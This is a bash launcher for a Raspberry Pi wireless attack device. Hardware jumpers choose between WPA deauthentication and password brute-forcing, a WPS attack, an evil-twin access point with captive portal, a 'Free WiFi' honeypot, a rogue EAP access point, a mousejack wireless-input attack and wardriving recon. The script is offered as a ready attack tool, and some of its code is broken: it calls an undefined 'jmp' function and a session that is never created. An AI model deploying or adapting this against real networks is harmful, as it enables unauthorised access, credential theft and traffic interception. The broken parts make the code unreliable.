#!/usr/bin/env bash
# Define LED control function (assuming pins: green=7, yellow=10, red=11)

# Adjust pins if needed
led() {
    case "$1" in
        green) pin=7 ;;
        yellow) pin=10 ;;
        red) pin=11 ;;
        *) echo "Invalid LED color: $1" >&2; return 1 ;;
    esac
    case "$2" in
        on) level=dh ;;
        off) level=dl ;;
        *) echo "Invalid LED state: $2" >&2; return 1 ;;
    esac
    raspi-gpio set $pin op $level
}
function monitor_enable() {
    iw phy0 interface add mon0 type monitor
    ip link set mon0 up
    iwconfig wlan0 up
}


# Set pull-ups for jumper pins
raspi-gpio set 7 ip pu
raspi-gpio set 10 ip pu
raspi-gpio set 11 ip pu
raspi-gpio set 23 ip pu
raspi-gpio set 25 ip pu
raspi-gpio set 27 ip pu
time=$(date +'%Y-%m-%d %H:%M:%S')


# LED startup blink (ignore errors)
led green on 2>/dev/null
led yellow on 2>/dev/null
sleep 1
led green off 2>/dev/null
led yellow off 2>/dev/null
led red off 2>/dev/null


# Main mode selection
if jmp 7; then
    echo "[*] wpa auth/deauth/online_brute attack (static/dynamic)"
    monitor_enable
    cd /home/pi/wpapsk || exit 1
    screen -dmS wpapsk -L -logfile "$time-wpapsk.log" ./
    #monitor.sh -c 1,6,11 -t deauth -X screen ./deauth.sh -b target.txt
    screen -S wpapsk -X screen -t deauth ./deauth.sh -c 1,6,11
    screen -S wpapsk -X screen -t brute ./brute-wpapsk.sh
    screen -S wpapsk -X screen -t auth ./auth.sh
    screen -S wpapsk -X screen -t brute-pmkid ./brute-pmkid.sh
    screen -S wpapsk -X screen -t online_brute ./online-brute.sh wpa-brute-width.sh "Target" 12345678 123456789 1234567890
elif jmp 11; then
    echo "[*] wps attack (static/dynamic)"
    monitor_enable
    cd /home/pi/wps || exit 1
    screen -dmS wps -L -logfile "$time-wps.log" ./.wps.sh "Target Wi-Fi"
elif jmp 10; then
    #monitor_enable
    echo "[*] enable/evil twin attack (static)"
    ifconfig wlan0 10.0.0.1/24
    iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 80
    cd /home/pi/evilwin || exit 1
    screen -dmS hostapd -L -logfile "$time-evilwin.log" ./hostapd.sh
    screen -S captive -X screen -t captive ./captive.sh www
    screen -S evilwin -X screen -t dnsmasq ./dnsmasq.sh
    screen -S evilwin -X screen -t deauth ./deauth.sh -c 1,6,11
elif jmp 23; then
    echo "[*] honeypot (static)"
    cd /home/pi/honeypot || exit 1
    screen -dmS honeypot -L -logfile "$time-honeypot.log" ./hostapd.sh
    screen -S honeypot -X screen -t dnsmasq ./dnsmasq.sh "Free WiFi"
    screen -S honeypot -X screen -t attack ./attack.sh
    cd -
elif jmp 25; then
    echo "[*] roqueap/eap (static)"
    cd /home/pi/eap || exit 1
    screen -dmS eap -t hostapd-eaphammer -L -logfile "$time-eap-%n.log" ./hostapd-eaphammer.sh "Target Wi-Fi"
    #screen -r eap -t deauth -X screen ./deauth.sh -c 1,6,11
    cd -
elif lsusb | grep -q 'Nordic Semiconductor'; then
    echo "[*] mousejack attack"
    cd /home/pi/mousejack || exit 1
    screen -dmS mousejack -t jackit -L -logfile "$time-mousejack-%n.log" './mousejack.sh'
    cd -
elif jmp 27; then
    echo "[*] wi-fi recon (dynamic)"
    monitor_enable
    cd /home/pi/recon || exit 1
    screen -dmS recon -t gpsd -L -logfile "$time-recon-%n.log" './gps.sh'
    screen -S recon -X screen -t kismet './kismet.sh'
    screen -S recon -X screen -t tcpdump './tcpdump.sh'
    cd -
else
    echo "No valid mode selected (checked jumpers: 7,10,11,23,25,27 and lsusb)"
    exit 1
fi
echo "Selected mode started. Use 'screen -ls' to check sessions."
